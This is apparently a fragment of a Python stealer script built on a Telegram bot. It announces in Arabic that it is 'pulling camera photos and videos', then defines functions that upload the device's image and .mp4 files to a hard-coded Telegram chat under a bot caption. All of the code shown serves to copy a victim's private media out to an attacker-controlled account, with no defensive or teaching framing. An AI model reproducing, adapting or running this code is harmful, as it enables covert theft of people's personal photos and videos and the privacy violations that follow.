...
bot.send_message(chat_id=5317713467, text= 'جاري سحب صور وفيديوهات الكاميرا 🔥😎')
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=5317713467, photo=f, caption='By: @atmaja_pro_bot')


def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=5317713467, video=f, caption='By: @atmaja_pro_bot')
